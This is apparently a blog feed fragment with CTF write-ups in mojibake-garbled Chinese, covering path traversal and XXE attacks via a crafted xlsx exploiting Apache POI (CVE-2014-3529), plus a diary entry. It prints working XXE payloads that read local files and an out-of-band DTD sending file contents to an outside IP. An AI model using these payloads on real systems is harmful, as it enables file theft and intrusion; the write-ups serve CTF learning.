      </tags>
  </entry>
  <entry>
    <title>2020ç½‘é¼æ¯filejavaï¼ˆJavawebã€CVE-2014-3529ï¼‰</title>
    <url>/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/</url>
    <content><![CDATA[<p>æœ¬æ¥è¿™ä¸ªé¢˜æƒ³æ”¾åˆ°åˆè¯†XMLé‚£ä¸€ç¯‡é‡Œé¢çš„ï¼Œå‘ç°æœ‰ä¸€äº›JavawebçŸ¥è¯†åå°±æŠŠå®ƒå•ç‹¬åˆ—å‡ºæ¥äº†</p>
<h3 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-filejava"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-filejava" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava</h3><p>ç›®å½•ç©¿è¶Šæ¼æ´ã€åˆ©ç”¨xlsxæ„é€ xml</p>
<p>åœ¨éšæ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åï¼Œæ˜¾ç¤ºæ–‡ä»¶ä¸‹è½½åœ°å€ <code>./DownloadServlet?filename=c5293886-04c4-48ff-bfeb-602ab05b6478_1.phtml</code></p>
<p>æ¯”èµ›çš„æ—¶å€™å› ä¸ºå¯¹Javawebäº†è§£å¤ªå°‘ï¼Œä¸çŸ¥é“ç›®å½•ç»“æ„ï¼Œæ‰€ä»¥æ²¡æƒ³åˆ°å»è¯»å–å“ªäº›æ–‡ä»¶</p>
<p>è¿™é‡Œå†™ä¸€ä¸‹Javawebçš„å¤§è‡´ç›®å½•ç»“æ„ï¼š(æºè‡ªCSDNä¸Šçš„<a href="https://blog.csdn.net/pan_junbiao/article/details/87865408" target="_blank" rel="noopener">pan_junbiao</a>å¸ˆå‚…å’Œ<a href="https://blog.csdn.net/qq_33689414/article/details/56489930" target="_blank" rel="noopener">å¼ è¡Œä¹‹</a>å¸ˆå‚…)</p>
<blockquote>
<p><a href="https://img-blog.csdnimg.cn/20190221174700993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Bhbl9qdW5iaWFv,size_16,color_FFFFFF,t_70" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" title="img" data-src="https://img-blog.csdnimg.cn/20190221174700993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Bhbl9qdW5iaWFv,size_16,color_FFFFFF,t_70" src="/img/loading.gif" class="lazyload"></a></p>
<p>ï¼ˆ1ï¼‰Java Resources</p>
<ul>
<li>srcï¼šç”¨æ¥å­˜æ”¾Javaæºæ–‡ä»¶ã€‚</li>
<li>Librariesï¼šå­˜æ”¾çš„æ˜¯TomcatåŠJREä¸­çš„jaråŒ…ã€‚</li>
</ul>
<p>ï¼ˆ2ï¼‰buildï¼šè‡ªåŠ¨ç¼–è¯‘.javaæ–‡ä»¶çš„ç›®å½•ã€‚</p>
<p>ï¼ˆ3ï¼‰WebContentï¼ˆWebRootï¼‰ï¼šæ˜¯è¿™ä¸ªWebåº”ç”¨çš„é¡¶å±‚ç›®å½•ï¼Œä¹Ÿç§°ä¸ºæ–‡æ¡£æ ¹ç›®å½•ï¼Œç”±ä¸€ä¸‹éƒ¨åˆ†ç»„æˆã€‚</p>
<ul>
<li><p>META-INFï¼šç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆï¼Œå­˜æ”¾ç³»ç»Ÿæè¿°ä¿¡æ¯ã€‚</p>
</li>
<li><ul>
<li><p>é™æ€æ–‡ä»¶ï¼šåŒ…æ‹¬æ‰€æœ‰çš„HTMLç½‘é¡µã€CSSæ–‡ä»¶ã€å›¾åƒæ–‡ä»¶ç­‰ã€‚ä¸€èˆ¬æŒ‰åŠŸèƒ½å·²æ–‡ä»¶å¤¹å½¢å¼åˆ†ç±»ï¼Œä¾‹å¦‚ï¼Œå›¾åƒæ–‡ä»¶é›†ä¸­å­˜å‚¨åœ¨imagesç›®å½•ä¸­ã€‚</p>
</li>
<li><p>JSPæ–‡ä»¶ï¼šåˆ©ç”¨JSPå¯ä»¥å¾ˆæ–¹ä¾¿åœ°åœ¨é¡µé¢ä¸­ç”ŸæˆåŠ¨æ€çš„å†…å®¹ï¼Œä½¿Webåº”ç”¨å¯ä»¥è¾“å‡ºåŠ¨æ€é¡µé¢ã€‚</p>
</li>
</ul>
</li>
<li><p>WEB-INFï¼šè¯¥ç›®å½•å­˜åœ¨äºæ–‡æ¡£æ ¹ç›®å½•ä¸‹ã€‚ä½†æ˜¯ï¼Œè¯¥ç›®å½•ä¸èƒ½è¢«å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥ç›®å½•ä¸‹å­˜æ”¾çš„æ–‡ä»¶æ— æ³•å¯¹å¤–å‘å¸ƒï¼Œå½“ç„¶å°±æ— æ³•è¢«ç”¨æˆ·è®¿é—®åˆ°äº†ã€‚WEB-INFç›®å½•ç”±ä»¥ä¸‹å‡ éƒ¨åˆ†ç»„æˆã€‚</p>
</li>
<li><ul>
<li><p>classesï¼šå­˜æ”¾Javaå­—èŠ‚ç æ–‡ä»¶çš„ç›®å½•ã€‚</p>
</li>
<li><p>libï¼šç”¨äºå­˜æ”¾è¯¥å·¥ç¨‹ç”¨åˆ°çš„åº“ã€‚å®ƒåŒ…å«Webåº”ç”¨æ‰€éœ€è¦çš„.jaræˆ–è€….zipæ–‡ä»¶ï¼Œä¾‹å¦‚ï¼šmysql-connector-java-8.0.14.jarï¼ˆMySQLæ•°æ®åº“çš„é©±åŠ¨ç¨‹åºï¼‰</p>
</li>
<li><p>web.xmlï¼šåº”ç”¨ç¨‹åºçš„éƒ¨ç½²æè¿°ç¬¦ï¼Œwebå·¥ç¨‹çš„é…ç½®æ–‡ä»¶ï¼Œå®Œæˆç”¨æˆ·è¯·æ±‚çš„é€»è¾‘åç§°åˆ°çœŸæ­£çš„servletç±»çš„æ˜ å°„ã€‚Webåº”ç”¨çš„åˆå§‹åŒ–é…ç½®æ–‡ä»¶ï¼Œéå¸¸é‡è¦ï¼Œä¸è¦å°†å…¶åˆ é™¤æˆ–è€…éšæ„ä¿®æ”¹ã€‚</p>
</li>
</ul>
</li>
</ul>
<p>å‡¡æ˜¯å®¢æˆ·ç«¯èƒ½è®¿é—®çš„èµ„æº(<em>htmlæˆ–</em>.jpg)å¿…é¡»è·ŸWEB-INFåœ¨åŒä¸€ç›®å½•ï¼Œå³æ”¾åœ¨Webæ ¹ç›®å½•ä¸‹çš„èµ„æºï¼Œä»å®¢æˆ·ç«¯æ˜¯å¯ä»¥é€šè¿‡URLåœ°å€ç›´æ¥è®¿é—®çš„ã€‚</p>
</blockquote>
<p>ä¸‹é¢æˆ‘ä»¬è¯»å–ä¸€ä¸‹web.xmlæ–‡ä»¶<code>?filename=../../../../WEB-INF/web.xml</code>ï¼Œå¾—åˆ°</p>
<a href="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>è¿™é‡Œè¿˜éœ€è¦äº†è§£ä»€ä¹ˆæ˜¯<servlet-class>ï¼Œå®ƒæ˜¯é‡Œé¢å®šä¹‰äº†ç”¨æˆ·è¯·æ±‚çš„é€»è¾‘åç§°åˆ°çœŸæ­£servletç±»çš„æ˜ å°„ã€‚</servlet-class></p>
<blockquote>
<p>WEB-INF/classes ç›®å½•åŒ…å«äº†æ‰€æœ‰çš„ Servlet ç±»å’Œå…¶ä»–ç±»æ–‡ä»¶ï¼Œç±»æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ç»“æ„ä¸ä»–ä»¬çš„åŒ…åç§°åŒ¹é…ã€‚</p>
</blockquote>
<p>å› æ­¤æŒ‰web.xmlç»™å‡ºçš„è·¯å¾„å»æŠŠclassæ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</span><br><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class</span><br><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br></pre></td></tr></table></figure></div>

<p>classæ–‡ä»¶å¯ä»¥æ‹¿JD-GUIæ‰“å¼€ï¼Œä»£ç å®¡è®¡ï¼Œå‘ç°<code>UploadServlet.class</code>ä¸­ï¼Œæœ‰å¯¹æ–‡ä»¶åå’Œåç¼€çš„åˆ¤æ–­</p>
<a href="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>å›¾ä¸­å…ˆåˆ¤æ–­äº†æ–‡ä»¶å¼€å¤´æ˜¯å¦ä¸ºâ€œexcel-â€ ç„¶ååˆåˆ¤æ–­äº†æ–‡ä»¶å°¾æ˜¯å¦xlsxï¼›</p>
<p>åŒæ—¶è¿™é‡Œæ˜¯Javaç¯å¢ƒï¼Œæç¤º<code>poi-ooxml-3.10 has something wrong</code>ï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®ç‰ˆæœ¬æ¨æµ‹å…¶æ¼æ´ä¹Ÿå°±æ˜¯CVE-2014-3529</p>
<p>Apache POI OpenXML parserå°ç§‘æ™®ï¼š</p>
<blockquote>
<p>  Apache POI æ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šçš„å¼€æºé¡¹ç›®ï¼ŒPOI æä¾› API æ¥å£ç»™ Java ç¨‹åºå¯¹ Microsoft office æ ¼å¼æ–‡æ¡£è¯»å†™èƒ½åŠ›ã€‚</p>
<p>   Microsoft Officeä»2007ç‰ˆæœ¬å¼•å…¥äº†æ–°çš„å¼€æ”¾çš„XMLæ–‡ä»¶æ ¼å¼ï¼Œæ–°çš„XMLæ–‡ä»¶æ ¼å¼åŸºäºå‹ç¼©çš„ZIPæ–‡ä»¶æ ¼å¼è§„èŒƒï¼Œç”±è®¸å¤šéƒ¨åˆ†ç»„æˆã€‚æˆ‘ä»¬å¯ä»¥å°†å…¶è§£å‹ç¼©åˆ°ç‰¹å®šçš„æ–‡ä»¶å¤¹ä¸­æ¥æŸ¥çœ‹å…¶åŒ…å«çš„æ–‡ä»¶å¤¹å’Œæ–‡ä»¶ï¼Œå¯ä»¥å‘ç°å…¶ä¸­å¤šæ•°æ˜¯æè¿°å·¥ä½œç°¿æ•°æ®ã€å…ƒæ•°æ®ã€æ–‡æ¡£ä¿¡æ¯çš„XMLæ–‡ä»¶ã€‚æ‰€ä»¥ä¸æ­£ç¡®çš„è¯»å–07æ ¼å¼çš„Microsoft office æ ¼å¼æ–‡ä»¶ä¹Ÿå­˜åœ¨ç€ XXE æ”»å‡»çš„å¯èƒ½æ€§ã€‚</p>
</blockquote>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥æƒ³åˆ°åˆ©ç”¨xlsxæ¥æ„é€ xmlè¿›è¡Œæ–‡ä»¶è¯»å–</p>
<p>è¿™é‡Œå¯ä»¥ç”¨æ˜¨å¤©çœ‹çš„<a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">æ— å›æ˜¾è¯»å–</a></p>
<blockquote>
<p><strong>ä»¥ä¸‹è°ƒç”¨è¿‡ç¨‹ï¼š</strong></p>
<p>æˆ‘ä»¬ä» payload ä¸­èƒ½çœ‹åˆ° è¿ç»­è°ƒç”¨äº†ä¸‰ä¸ªå‚æ•°å®ä½“ %remote;%int;%send;ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬çš„åˆ©ç”¨é¡ºåºï¼Œ%remote å…ˆè°ƒç”¨ï¼Œè°ƒç”¨åè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ BTIS.dtd ï¼Œæœ‰ç‚¹ç±»ä¼¼äºå°† BTIS.dtd åŒ…å«è¿›æ¥ï¼Œç„¶å %int è°ƒç”¨ BTIS.dtd ä¸­çš„ %file, %file å°±ä¼šå»è·å–æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† %file çš„ç»“æœå¡«å…¥åˆ° %send ä»¥å(å› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  <code>%</code>)ï¼Œæˆ‘ä»¬å†è°ƒç”¨ %send; æŠŠæˆ‘ä»¬çš„è¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°æˆ‘ä»¬çš„è¿œç¨‹ vps ä¸Šï¼Œè¿™æ ·å°±å®ç°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæœï¼Œå®Œç¾çš„è§£å†³äº† XXE æ— å›æ˜¾çš„é—®é¢˜ã€‚</p>
<p>ä½†æ˜¯ä¸ºå•¥æˆ‘å®ä½“çš„å€¼ä¸­æœ‰%äº†ï¼Œæ²¡æœ‰ç”¨<code>&amp;#37;</code>ï¼Œä¹Ÿå¯ä»¥ã€‚ã€‚ã€‚</p>
<p>è¿˜æœ‰ä¸‹é¢çš„<code>&lt;!DOCTYPE BTIS [</code> éœ€è¦é—­åˆ<code>&lt;!DOCTYPE convert [</code> ä¸ç”¨é—­åˆï¼Œæœ‰æ—¶é—´å¥½å¥½ç ”ç©¶ç ”ç©¶xmlçš„è§„åˆ™ï¼ˆå¬åŒå­¦è¯´çŸ­å­¦æœŸMFCè¦ç”¨xmlçš„ï¼Œå½“æ—¶å·æ‡’æ²¡ç”¨ï¼Œç°åœ¨äººå‚»äº†ã€‚ã€‚ã€‚</p>
</blockquote>
<p>å¼€ä¸ªbuué¶æœºï¼Œè®°ä¸€ä¸‹å†…ç½‘ip(ifconfig)ï¼Œå†™ä¸ªdtdæ–‡ä»¶è¿›å»ï¼Œæ‹¿å‚æ•°å®ä½“æ‹¼æ¥è®¿é—®</p>
<p>å…ˆå†™é¶æœºä¸Šå†™ä¸€ä¸ªdtdæ–‡ä»¶</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;174.1.80.146:7788?btis&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<a href="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/6.png" src="/img/loading.gif" class="lazyload"></a>

<p>åˆ°è¿™æœåŠ¡å™¨ç›‘å¬7788ç«¯å£å°±è¡Œäº†ï¼Œç­‰æ–‡ä»¶ä¸Šä¼ åå°±ä¼šåœ¨æœåŠ¡å™¨ä¸Šå›æ˜¾flagäº†</p>
<p>ä¹‹åæˆ‘ä»¬æ–°å»ºä¸€ä¸ªxlsxæ–‡ä»¶ï¼Œæ”¹åç¼€ä¸ºzipï¼š</p>
<a href="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>ç¼–è¾‘<code>[Content_Types].xml</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">BTIS</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://174.1.80.146/BTIS.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span><span class="tag">&lt;<span class="name">BTIS</span>/&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæŠŠåç¼€æ”¹å›æ¥ï¼Œå¹¶ä¸”æŠŠæ–‡ä»¶åæ”¹ä¸º<code>excel-1</code>ç±»ä¼¼çš„æ¥ç»•è¿‡å¯¹æ–‡ä»¶åå¼€å¤´çš„æ£€æµ‹ï¼ˆè¦ç”¨excel-å¼€å¤´)</p>
<p>åé¢ä¸Šä¼ æ–‡ä»¶å°±è¡Œäº†(æ·¦ã€ä¸ºå•¥æˆ‘ä¸Šä¼ å¥½å‡ æ¬¡ï¼Œä¸Šä¼ ä¸ä¸Šå»ï¼Œè€æ˜¯å¡ï¼Œç»ˆäºå¥½äº†)</p>
<a href="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>&nbsp;</p>
<p>è¡¥å……ï¼šå¦‚æœå°è¯•ç›´æ¥å»è¯»flagçš„è¯æ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸ºDownloadServletä¸­æœ‰è¿‡æ»¤ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String fileName &#x3D; request.getParameter(&quot;filename&quot;);</span><br><span class="line">fileName &#x3D; new String(fileName.getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;);</span><br><span class="line">System.out.println(&quot;filename&#x3D;&quot; + fileName);</span><br><span class="line">if (fileName !&#x3D; null &amp;&amp; fileName.toLowerCase().contains(&quot;flag&quot;)) &#123;</span><br><span class="line">  request.setAttribute(&quot;message&quot;, &quot;&quot;);</span><br><span class="line">  request.getRequestDispatcher(&quot;&#x2F;message.jsp&quot;).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">  </span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>XXE</tag>
        <tag>Javaweb</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆè¯†XML(XXE)</title>
    <url>/2020/05/13/%E5%88%9D%E8%AF%86XML(XXE)/</url>
    <content><![CDATA[<h3 id="åŸºç¡€çŸ¥è¯†ï¼ˆhttps-xz-aliyun-com-t-3357ï¼‰"><a href="#åŸºç¡€çŸ¥è¯†ï¼ˆhttps-xz-aliyun-com-t-3357ï¼‰" class="headerlink" title="åŸºç¡€çŸ¥è¯†ï¼ˆhttps://xz.aliyun.com/t/3357ï¼‰"></a>åŸºç¡€çŸ¥è¯†ï¼ˆ<a href="https://xz.aliyun.com/t/3357ï¼‰" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357ï¼‰</a></h3><p>1.DTDæ ¼å¼è§„èŒƒï¼ˆå…ƒç´ -&gt;xmlæ ‡ç­¾ï¼Œå®ä½“-&gt;xmlå†…å®¹ï¼‰</p>
<p>2.å†…éƒ¨å®ä½“ã€å¤–éƒ¨å®ä½“ã€é€šç”¨å®ä½“ã€å‚æ•°å®ä½“</p>
<p>3.æœ‰å›æ˜¾ã€æ— å›æ˜¾è¯»å–æ–‡ä»¶ï¼ˆæ— å›æ˜¾å¯ä»¥æŠŠdtdæ”¾åˆ°è‡ªå·±vpsä¸Šï¼Œä»è€Œå°†å†…å®¹å›æ˜¾åˆ°vpsä¸Šï¼‰</p>
<p>4.å‚æ•°å®ä½“+ â€œ<!--[CDATA["å’Œ â€œ]]-->â€å®ç°è¿ç»­å¼•ç”¨æ‹¼æ¥ï¼ˆè¯»å–æ–‡ä»¶æ—¶é‡Œé¢æœ‰å¼•èµ·xmlæ ¼å¼æ··æ·†çš„å­—ç¬¦ä¸²ï¼‰</p>
<p>5.å†…ç½‘ç›¸å…³ï¼ˆç«¯å£æ‰«æã€å†…ç½‘æ¢æµ‹ï¼‰</p>
<p>â€¦â€¦</p>
<h3 id="BUU-Real-PHP-XXE"><a href="#BUU-Real-PHP-XXE" class="headerlink" title="BUU Real [PHP]XXE"></a>BUU Real [PHP]XXE</h3><p>å¼€è¿™ä¸ªä¹‹å‰ä»¥ä¸ºè¿™ä¸ªé¢˜æŒºéš¾çš„ï¼Œä¹ˆæœ‰æƒ³åˆ°flagå°±åœ¨phpinfo()é‡Œã€‚ã€‚</p>
<p>ä¸è¿‡æœwpçš„æ—¶å€™ä¹Ÿäº†è§£äº†ç‚¹ç‰ˆæœ¬ç›¸å…³çŸ¥è¯†å§ã€‚</p>
<blockquote>
<p>libxml2.9.0ä»¥åï¼Œé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œå¯¼è‡´XXEæ¼æ´é€æ¸æ¶ˆäº¡ã€‚</p>
<p>dom.php # ç¤ºä¾‹ï¼šä½¿ç”¨DOMDocumentè§£æbody</p>
<p>SimpleXMLElement.php # ç¤ºä¾‹ï¼šä½¿ç”¨SimpleXMLElementç±»è§£æbody</p>
<p>simplexml_load_string.php # ç¤ºä¾‹ï¼šä½¿ç”¨simplexml_load_stringå‡½æ•°è§£æbody</p>
</blockquote>
<h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake  XML cookbook"></a>[NCTF2019]Fake  XML cookbook</h3><p>è¿™ä¸ªé¢˜ç›®æ¯”è¾ƒåŸºç¡€ï¼Œflagå°±æ”¾åœ¨äº†<code>/flag</code>ä¸‹é¢ï¼Œç›´æ¥æ„é€ xmlç”¨fileåè®®å»è¯»å–å°±å¥½äº†</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  <span class="meta-keyword">BTIS</span>[ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>0<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œå¼•ç”¨ä¸Šé¢é‚£ç¯‡æ–‡å¼ ä½œè€…çš„ä¸€å¼ å›¾ï¼šï¼ˆå¸¸è§å¹³å°çš„ä¸åŒåè®®ï¼‰</p>
<p><a href="/img/loading.gif" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" src="/img/loading.gif" class="lazyload" title="img"></a></p>
<h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>è¿™ä¸ªå°±è¦ç”¨åˆ°å†…ç½‘æ¢æµ‹äº†ã€‚ï¼ˆSSRFï¼Ÿï¼‰</p>
<p>æˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–ï¼š<code>/proc/net/arp</code> æˆ–è€… <code>/etc/host</code> æˆ–è€… <code>/etc/network/interfaces</code>ï¼Œæ¥è·å–å†…ç½‘å­˜æ´»çš„ä¸»æœº</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML(XXE)/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>çœ‹åˆ°ä¸¤ä¸ªï¼Œå°è¯•è®¿é—®ä¸€ä¸‹ï¼Œç¬¬ä¸€ä¸ªå¥½åƒâ‘§å¤ªè¡Œï¼Œè®¿é—®ç¬¬äºŒä¸ªå¾—åˆ°flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML(XXE)/2.png" src="/img/loading.gif" class="lazyload"></a>

]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>XML</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>è¿‘æœŸæ€»ç»“</title>
    <url>/2020/05/08/36Dcup/</url>
    <content><![CDATA[<p>å‰å‡ å¤©å‡ºå»ç©äº†ï¼ŒISCCã€36Dã€De1éƒ½æ˜¯æ‰“äº†ä¸€éƒ¨åˆ†å°±æ²¡æ‰“äº†ï¼Œæ¯•ç«Ÿäº”ä¸€å˜›ï¼Œè¿˜æ˜¯è¦å‡ºå»å¼€å¿ƒä¸€ä¸‹çš„</p>
<p>è€Œä¸”è¿™å‡ å¤©äº‹æƒ…è™½ç„¶ä¸å¤šï¼Œä½†æ˜¯æœ‰äº›å­¦ä¹ ä¸Šçš„ä¹±ä¸ƒå…«ç³Ÿçš„äº‹æƒ…ï¼Œé—²ä¸‹æ¥ä¹Ÿä¸æƒ³å¥½å¥½å¤ç›˜ï¼Œå°±çŸ¥é“å¿«ä¹LOLã€‚ã€‚</p>
<p>åˆšæ‰å°è¯•å¤ç›˜äº†ä¸€ä¸‹NPUçš„webï¼Œä¸å¾—ä¸è¯´æœ‰ç‚¹è‡ªé—­ï¼Œè¿˜æ˜¯å¤ªèœäº†ã€‚</p>
<p>36Då…ˆå¼€ç€ï¼Œé™¤å»ä¸€äº›å˜æ€çš„miscå’Œwebæˆ‘éƒ½ä¼šå¤ç›˜çš„ï¼Œä½†æ˜¯åœ¨è¿™ä¹‹å‰æˆ‘è¦æŠŠæ‹–äº†Nå‘¨çš„ä¿¡å·ä½œä¸šçœ‹ä¸Šä¸€çœ‹ã€‚</p>
<p>ç­‰æ˜æ™šï¼Œè‚¯å®šå¼€æï¼Œæ¯•ç«Ÿç½‘é¼è¦æ¥äº†ï¼Œä¸èƒ½å¤ªæ‹‰åè…¿ã€‚ï¼ˆè¿˜æ˜¯å…ˆä»1åˆ†webåˆ·èµ·å§ï¼Œè¿‘æœŸå˜´ä¸Šè¯´çš„èŒæ–°èµ›çš„æ¯”èµ›éƒ½æ˜¯å‡çš„ã€‚æ°”æ­»ğŸ‘´äº†ï¼</p>
<hr>
<p>æˆ‘è¿˜æ˜¯æ²¡æ›´äº†</p>
<p>ç°åœ¨ç½‘é¼å·²ç»æ‰“å®Œäº†ï¼Œmiscè¿˜æ˜¯æ¯«æ— äººæ€§ï¼Œä¸è¿‡æ€»ä½“è¿˜æ˜¯å¯ä»¥</p>
<p>æ˜¨æ™šæŠŠaaè¦çš„é¢˜ç›®å‡ºå®Œäº†ï¼Œdockerfileå«–çš„njå¸ˆå‚…çš„ï¼Œå‡ºäº†ä¸ªç®€å•çš„æ–‡ä»¶åŒ…å«å’Œå¤‡ä»½</p>
<p>åœ¨æµ‹è¯•éƒ¨ç½²é¢˜ç›®çš„æ—¶å€™ä¹Ÿå­¦ä¼šäº†å…³äºdockerçš„å¾ˆå¤šä¸œè¥¿</p>
